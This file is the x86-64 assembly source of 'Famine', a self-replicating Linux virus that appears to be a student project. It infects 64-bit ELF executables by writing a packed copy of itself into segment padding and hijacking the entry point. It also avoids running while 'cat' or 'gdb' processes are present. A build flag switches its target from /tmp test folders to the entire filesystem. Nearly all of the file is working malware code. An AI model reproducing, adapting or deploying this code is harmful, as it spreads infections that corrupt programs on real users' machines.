;-------------------------------------------------------------------------------
;|     .-.               ______              _                                 |
;|     |.|              |  ____|            (_)                                |
;|   /)|`|(\            | |__ __ _ _ __ ___  _ _ __   ___                      |
;|  (.(|'|)`)           |  __/ _` | '_ ` _ \| | '_ \ / _ \                     |
;|    \`'./'            | | | (_| | | | | | | | | | |  __/        (_)          |
;|_____|'|______________|_|  \__,_|_| |_| |_|_|_| |_|\___|_________\"\_________|
;|    ,|'|.          ~~                            ~~               ^~^        |
;-------------------------------------------------------------------------------

section.text:
	global _start:function

; -== Optimization ==-
;-> Save bytes:
;	mov x, 1 => 5 bytes
;but:
;	push 1
;	pop x
;			=> 3 bytes
;and
;xor x, x => 3 bytes (put 0 into x)

; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific
; order (make sense with syscall)

_params:; filled for infected binaries
	length dq 0x0; length of the packed virus
	entry_inject dq 0x0; entry of the virus in file
	entry_prg dq 0x0; entry of the prg

_start:
	call _inject; push addr to stack

signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature

_inject:
	pop r8; pop addr from stack
	sub r8, 0x5; sub call instr
	; r8 contains the entry of the virus (for infected file cpy)

	; copy the prg in memory and launch it
	xor rax, rax; = 0
	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
	jne .infected

	; host part
	call _search_dir
	jmp _end_host

	.infected:
		push rdx

		push r8
		; copy the virus into a mmap executable
		xor rdi, rdi; NULL

		lea rsi, [rel _eof]
		lea r8, [rel _params]
		sub rsi, r8
		push 7
		pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
		push 34
		pop r10; MAP_PRIVATE | MAP_ANON
		push -1
		pop r8 ; fd
		xor r9, r9; offset
		push 9
		pop rax; mmap
		syscall

		push rsi; save length

;		memcpy(void *dst, void *src, size_t len)
		push rax
		pop rdi ; addr
		lea rsi, [rel _params]
		lea rdx, [rel _pack_start]
		sub rdx, rsi
		call _ft_memcpy

		mov r9, rdi; save addr
;		unpack(void *dst, void *src, size_t len)
		add rdi, rdx
		add rsi, rdx
		mov rax, [rel length]
		sub rax, rdx; length - [packed_part - params]
		push rax
		pop rdx

		call _unpack

		push r9
		pop rdi
		pop rsi

		pop r8

		push rsi ; save length

		lea rsi, [rel _params]
		lea rax, [rel _search_dir]
		sub rax, rsi
		add rax, rdi

		push rdi ; save addr

		call rax ; jump to mmaped memory

		pop rdi ; pop addr
		pop rsi ; pop length

		; munmap the previous exec
		push 11
		pop rax
		syscall
		pop rdx

		; end infected file
		push r8
		pop rax

		sub rax, [rel entry_inject]
		add rax, [rel entry_prg]

		; jmp on entry_prg
		jmp rax

;                 v dst      v src       v size
_unpack:; (void *rdi, void *rsi, size_t rdx)
	push r8
	push r9
	push r10
	push r11
	push rcx

	push rdi
	pop r9
	push rsi
	pop r10
	push rdx
	pop r11

	xor rax, rax
	xor rcx, rcx; i
	xor r8, r8; j
	.loop_uncompress:
		cmp rcx, r11
		jge .end_loop
		cmp byte[r10 + rcx], 244
		je .uncompress_char
			mov al, [r10 + rcx]
			mov [r9 + r8], al
			inc rcx
			inc r8
		jmp .loop_uncompress
		.uncompress_char:
			mov rdi, r9
			add rdi, r8
			mov al, [r10 + rcx + 1]
			mov rsi, rdi
			sub rsi, rax
			mov al, [r10 + rcx + 2]
			mov rdx, rax
			call _ft_memcpy
			xor rax, rax
			mov al, byte[r10 + rcx + 2]
			add r8, rax
			add rcx, 3
		jmp .loop_uncompress
	.end_loop:
		push r9
		pop rdi
		push r10
		pop rsi
		push r11
		pop rdx

	pop rcx
	pop r11
	pop r10
	pop r9
	pop r8
ret

_ft_memcpy: ; (string rdi, string rsi, size_t rdx)
	push rcx

	xor rax, rax
	xor rcx, rcx
	.loop_byte:
		cmp rcx, rdx
		je .return
		mov al, [rsi + rcx]
		mov [rdi + rcx], al
		inc rcx
	jmp .loop_byte
	.return:
		mov rax, rdi

	pop rcx
ret

; packer-part till _eof --------------------------------------------------------
_pack_start:
_search_dir:
	; check for process running
	push 1
	pop rsi ; mode for move_through_dir
	lea rdi, [rel process_dir]

	call _move_through_dir

	cmp rax, 0x0
	jne .return
	xor rsi, rsi ; mode for move_through_dir
	lea rdi, [rel directories]
	xor rcx, rcx; = 0
	.loop_array_string:
		add rdi, rcx
		call _ft_strlen
		push rax
		pop rcx
		call _move_through_dir
	inc rcx
	cmp byte[rdi + rcx], 0x0
	jnz .loop_array_string
	.return:
ret

_move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
	push r10
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	push rsi
	pop r13

	push 2
	pop rax; open
	push 0o0200000; O_RDONLY | O_DIRECTORY
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower

	push rdi
	pop r10; path

	sub rsp, 1024
	push rax
	.getdents:
		pop rdi
		push 78
		pop rax; getdents
		push 1024
		pop rdx; size of buffer
		mov rsi, rsp; buffer
		syscall
		push rdi
		push rsi
		pop r12
		cmp rax, 0x0
		jle .close
		push rax
		pop rdx; nread
		xor rcx, rcx; = 0

	.loop_in_file:
		cmp rcx, rdx
		jge .getdents; rcx >= rdx
		mov rdi, r12
		add rdi, rcx; r12 => linux_dir
		; if not . .. +18
		add rdi, 18; linux_dir->d_name
		
		; ft_strcmp with '.' and '..' to not infect_dir with them
		push rcx
		lea rsi, [rel dotdir]
		xor rcx, rcx; = 0
		.loop_array_string:
			add rsi, rcx
			call _ft_strcmp
			cmp rax, 0x0
			je .next_file
			xor rcx, rcx; = 0
			.next_string:; seek next dir
				inc rcx
				cmp byte[rsi + rcx], 0x0
				jnz .next_string
		inc rcx
		cmp byte[rsi + rcx], 0x0
		jnz .loop_array_string

		; concat_path
			push rbx
			sub rsp, 4096

			push rdi
			pop rbx
			mov rdi, rsp; buffer
			mov rsi, r10
			call _ft_strcpy
			push rbx
			pop rsi
			call _ft_concat_path

		; check infect_dir or infect_file
			sub rsp, 600

			push 4
			pop rax ; stat
			mov rsi, rsp ; struct stat
			syscall
			cmp rax, 0x0
			jne .free_buffers

			mov rax, [rsi + 24] ; st_mode
			and rax, 0o0170000 ; S_IFMT

			cmp r13, 0; infect
			je .infect

			; process
			cmp rax, 0o0040000 ; S_IFDIR
			jne .free_buffers

			; if /proc/[nb] -> check /proc/[nb]/status
			push rdi
			push rbx
			pop rdi
			call _ft_isnum
			pop rdi
			cmp rax, 0x0
			je .free_buffers
			lea rsi, [rel process_status]
			call _ft_concat_path
			call _check_file_process
			cmp rax, 0x0
			jne .process_found

			jmp .free_buffers
			.infect:
				cmp rax, 0o0100000 ; S_IFREG
				je .infect_file
				cmp rax, 0o0040000 ; S_IFDIR
				jne .free_buffers

			; infect dir
			xor rsi, rsi; infect -> 0
			call _move_through_dir
			jmp .free_buffers

		.infect_file:
			call _infect_file

		.free_buffers:
			add rsp, 4696
			pop rbx

		.next_file:
			pop rcx
			mov rsi, r12
			add rsi, rcx
			push rdi
			movzx edi, word [rsi + 16]; linux_dir->d_reclen
			add rcx, rdi
			pop rdi
			jmp .loop_in_file

	.process_found:
		add rsp, 4696
		pop rbx
		pop rcx

	.close:
		push rax
		pop rsi
		pop rdi; fd
		push 3
		pop rax; close
		syscall
		push r10
		pop rdi
		add rsp, 1024
		push rsi
		pop rax

	.return:

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r10
ret

_infect_file: ; (string rdi, stat rsi)
	push r10
	push r11
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	push rsi
	pop r12
	push 2
	pop rax; open
	push 0o0000002; O_RDWR
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower
	push rdi
	pop r10 ; path

	push r8
	push rax
	pop r8

	push r10
	xor rdi, rdi
	mov rsi, [r12 + 48] ; statbuf.st_size
	push 3
	pop rdx ; PROT_READ | PROT_WRITE
	push 2
	pop r10 ; MAP_PRIVATE
	xor r9, r9
	push 9
	pop rax ; mmap
	syscall
	pop r10
	push r8
	pop r11; fd
	pop r8
	cmp rax, 0x0
	jl .close ; < 0

	push rax
	pop rsi
	lea rdi, [rel elf_magic]
	push 5
	pop rdx
	call _ft_memcmp
	push rsi
	pop r13
	cmp rax, 0x0
	jne .unmap ; not elf 64 file

	cmp byte[rsi + 16], 2 ; ET_EXEC
	je .is_elf_file
	cmp byte[rsi + 16], 3 ; ET_DYN
	jne .unmap

	.is_elf_file:
		; TODO: do 32 bits version (new compilation ?)

		; get pt_load exec
		mov ax, [r13 + 56]; e_phnum
		mov rbx, r13
		add rbx, [r13 + 32]; e_phoff
		xor rcx, rcx
		.find_segment_exec:
			inc rcx
			cmp rcx, rax ; TODO: can't be last PT_LOAD now
			je .unmap
			cmp dword[rbx], 1 ; p_type != PT_LOAD
			jne .next
			mov dx, [rbx + 4]; p_flags
			and dx, 1 ; PF_X
			jnz .check_if_infected
			.next:
				add rbx, 56; sizeof(Elf64_Phdr)
			jmp .find_segment_exec
		.check_if_infected:
			lea rdi, [rel signature]
			call _ft_strlen
			push rax
			pop rcx
			push rdi
			pop rdx
			mov rdi, [rbx + 8]; p_offset
			add rdi, r13
			mov rsi, [rbx + 32]; p_filesz
			cmp rsi, rcx
			jl .unmap
			call _ft_memmem
			cmp rax, 0x0
			jne .unmap

			; check size needed
			sub rdi, r13
			mov rdi, [rbx + 8]
			add rdi, rsi; p_offset + p_filesz
			mov rsi, [rbx + 56 + 8] ; next->p_offset
			sub rsi, rdi

			add rdi, 8 * 3 ; let space for params

			; host
			lea rdx, [rel _eof]
			lea r9, [rel _params]
			sub rdx, r9
			cmp rsi, rdx
			jl .unmap ; if size between PT_LOAD isn't enough -> abort

			xor r9, r9
			cmp r9, [rel entry_inject]
			jne .infected

			; ==		copy start of the virus
			add rdi, r13 ; addr pointer -> mmap
			mov rax, rdi
			push rax; save

			lea rsi, [rel _start]
			lea rdx, [rel _pack_start]
			sub rdx, rsi
			call _ft_memcpy

			; ==		pack a part
			add rdi, rdx
			call _pack
			push rax
			pop r9

			; ==		change rdx, rax, rdi
			add rdx, r9
			pop rdi; mmap
			mov rax, rdi

			jmp .params

			.infected:
			; TODO: CA NE MARCHERA JAAAMMAAAIIISS
			mov rdx, [rel length]
			sub rdx, 8 * 3
			; copy virus
			add rdi, r13 ; addr pointer -> mmap
			add rdi, 8 * 3
			mov rsi, r8
			call _ft_memcpy
			mov rax, rdi

			.params:
			; add _params
			sub rax, 8 * 3
			add rdx, 8 * 3
			mov [rax], rdx ; length
			add rax, 8
			sub rdi, r13
			; copy mapped 'padding' like 0x400000
			mov rsi, rdi
			add rsi, [rbx + 16]; p_vaddr
			sub rsi, [rbx + 8]; p_offset
			mov [rax], rsi ; entry_inject
			add rax, 8
			mov rsi, [r13 + 24]; entry_prg
			mov [rax], rsi

			; change entry
			; copy mapped 'padding' like 0x400000
			add rdi, [rbx + 16]; vaddr
			sub rdi, [rbx + 8]; p_offset
			mov [r13 + 24], rdi ; new_entry

			; change pt_load size
			add [rbx + 32], rdx; p_filesz + virus
			add [rbx + 40], rdx; p_memsz + virus

			; write everything in file
			mov rdi, r11
			push r11
			mov rsi, r13
			mov rdx, [r12 + 48]
			push 1
			pop rax
			syscall
			pop r11
	.unmap:
		push r11; munmap using r11 ?
		push r13
		pop rdi
		mov rsi, [r12 + 48] ; statbuf.st_size
		push 11
		pop rax; munmap
		syscall
		pop r11
	.close:
		push r11
		pop rdi
		push 3
		pop rax; close
		syscall
	.return:
		push r10
		pop rdi
		push r12
		pop rsi

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r11
	pop r10
ret

_check_file_process:; (string rdi)
	push r8
	push rcx
	push rdx
	push rsi

	sub rsp, 0x800; buffer to read

	xor rsi, rsi; O_RDONLY
	push 2
	pop rax; open
	syscall
	push rdi
	pop r8
	push rax
	pop r9; fd
	xor rax, rax ; read and 0 if can't open
	cmp r9, 0x0
	jl .return; jump lower

	mov rdi, r9
	mov rsi, rsp
	push 0x800
	pop rdx
	syscall

	cmp rax, 0x0
	je .close

		push rax
		pop rsi
		lea rdi, [rel process]
		xor rcx, rcx; = 0
		.loop_array_string:
			add rdi, rcx
			; check if it is in the file
			call _ft_strlen
			cmp rsi, rax
			jl .close
			push rax
			pop rcx
			push rdi
			pop rdx
			mov rdi, rsp; buffer
			call _ft_memmem
			cmp rax, 0x0
			jne .close
			push rdx
			pop rdi
		inc rcx
		cmp byte[rdi + rcx], 0x0
		jnz .loop_array_string

	xor rax, rax
	.close:
		push rax
		pop rsi
		push r9
		pop rdi
		push 3
		pop rax; close
		syscall
		push rsi
		pop rax
	.return:
		push r8
		pop rdi

	add rsp, 0x800

	pop rsi
	pop rdx
	pop rcx
	pop r8
ret

; -------------------------------- utils ---------------------------------------

_ft_concat_path: ;(string rdi, string rsi) -> rdi is dest, must be in stack or mmaped region
	push rdx

	mov rdx, rdi
	call _ft_strlen
	add rdi, rax
	mov byte[rdi], '/'
	inc rdi
	call _ft_strcpy
	push rdx
	pop rdi
	mov rax, rdi

	pop rdx
ret

_ft_isnum:; (string rdi) ; 0 no - otherwise rax something else
	xor rax, rax
	.loop_char:
		cmp byte[rdi + rax], 0x0
		je .return
		cmp byte[rdi + rax], '0'
		jl .isnotnum
		cmp byte[rdi + rax], '9'
		jg .isnotnum
		inc rax
	jmp .loop_char
	.isnotnum:
		xor rax, rax
	.return:
ret

_ft_strlen:; (string rdi)
	xor rax, rax; = 0
	.loop_char:
		cmp byte [rdi + rax], 0
		jz .return
		inc rax
	jmp .loop_char
	.return:
ret

_ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
	push rcx
	dec rdx

	xor rax, rax
	xor rcx, rcx; = 0
	.loop_byte:
		mov al, [rdi + rcx]
		cmp al, [rsi + rcx]
		jne .return
		cmp rcx, rdx
		je .return
		inc rcx
	jmp .loop_byte
	.return:
		sub al, [rsi + rcx]

	inc rdx
	pop rcx
ret

_ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
	push r8
	push r9
	push rbx

	xor rax,rax
	xor r8, r8
	sub rsi, rcx
	cmp rsi, 0x0
	jl .return
	cmp rcx, 0x0
	je .return
	.loop_byte:
		xor rax,rax
		cmp r8, rsi
		je .return
		mov rbx, rdi
		add rdi, r8
		push rsi
		pop r9
		push rdx
		pop rsi
		push rcx
		pop rdx
		call _ft_memcmp
		push rdx
		pop rcx
		push rsi
		pop rdx
		push r9
		pop rsi
		push rbx
		pop rdi
		cmp rax, 0x0
		je .found
		inc r8
	jmp .loop_byte
	.found:
		mov rax, rdi
		add rax, r8
	.return:
		add rsi, rcx

	pop rbx
	pop r9
	pop r8
ret

_ft_strcmp: ; (string rdi, string rsi)
	push rdx

	call _ft_strlen
	push rax
	pop rdx
	push rdi
	push rsi
	pop rdi
	call _ft_strlen
	push rdi
	pop rsi
	pop rdi
	cmp rax, rdx
	je .continue
	inc rdx
	.continue:
	call _ft_memcmp

	pop rdx
ret

_ft_strcpy: ; (string rdi, string rsi)
	push rdx

	push rdi
	pop rdx
	push rsi
	pop rdi
	call _ft_strlen
	push rdi
	pop rsi
	push rdx
	pop rdi
	push rax
	pop rdx
	inc rdx
	call _ft_memcpy

	pop rdx
ret

; ---------------------------- STATIC PARAMS -----------------------------------

;                   E     L    F   |  v ELFCLASS64
elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
%ifdef FSOCIETY
	directories db `/`, 0x0, 0x0
	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, `sys`, 0x0, 0x0
%else
	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
	dotdir db `.`, 0x0, `..`, 0x0, 0x0
%endif

	process_dir db `/proc`, 0x0
	process_status db `status`, 0x0
	process db `\tcat\n`, 0x0, `\tgdb\n`, 0x0, 0x0

_eof:

; ------------------------------- HOST ---------------------------------------

; don't need to copy the host part
; v

_end_host:
	push 60
	pop rax ; exit
	xor rdi, rdi; = 0
	syscall

;               v dest
_pack: ;(void *rdi) -> ret size + fill rdi
	push r8
	push r10
	push r11
	push r12
	push rbx
	push rcx
	push rdx
	push rsi

	lea rdx, [rel _eof]
	lea r10, [rel _pack_start] ; dictionary = addr
	mov r11, r10; buffer = addr
	sub rdx, r10; size

	xor rcx, rcx; i = 0
	xor r8, r8; l = 0
	.loop_compress:
		cmp rcx, rdx; while (i < size) {
		jge .end_compress
		mov rsi, r10
		sub rsi, r11; len = dictionary - buffer
		cmp rsi, 255; if (len > 255) {
		jle .continue
		add r11, rsi
		sub r11, 255; buffer += len - 255
		mov rsi, r10
		sub rsi, r11; len = dictionary - buffer
		.continue: ; }
		push 1
		pop rbx; k = 1
		xor r12, r12; prev_ret = 0
		.loop_memmem:; while
			cmp rbx, 255
			jge .end_memmem; (k < 255
			mov rax, rbx
			add rax, rcx
			cmp rax, rdx; && i + k < size)
			jge .end_memmem
			push rdi
			push rdx
			push rcx
			mov rdi, r11
			mov rdx, r10
			mov rcx, rbx
			call _ft_memmem; ret = ft_memmem(buffer, len, dictionary, k)
			pop rcx
			pop rdx
			pop rdi
			cmp rax, 0x0; if (!ret) break
			je .end_memmem
			push rax
			pop r12; prev_ret = ret
			inc rbx; k++
		jmp .loop_memmem
		.end_memmem:; }
		dec rbx; k--
		cmp r12, 0x0; if (prev_ret
		je .not_compress_char
		cmp rbx, 4; && k >= 4) {
		jl .not_compress_char
		mov byte[rdi + r8], 244; addr[l] = 244
		inc r8; l++
		mov rax, r10
		sub rax, r12
		mov byte[rdi + r8], al; addr[l] = dictionary - prev_ret
		inc r8; l++
		mov rax, rbx
		mov byte[rdi + r8], al; addr[l] = k
		inc r8; l++
		jmp .next_loop; }
		.not_compress_char:; else {
		push 1
		pop rbx; k = 1
		mov al, [r10]
		mov byte[rdi + r8], al; addr[l] = *dictionary
		inc r8; l++
	.next_loop:; }
		add r10, rbx; dictionary += k
		add rcx, rbx; i += k
		jmp .loop_compress
	.end_compress: ; }
		push r8
		pop rax

	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop r12
	pop r11
	pop r10
	pop r8
ret
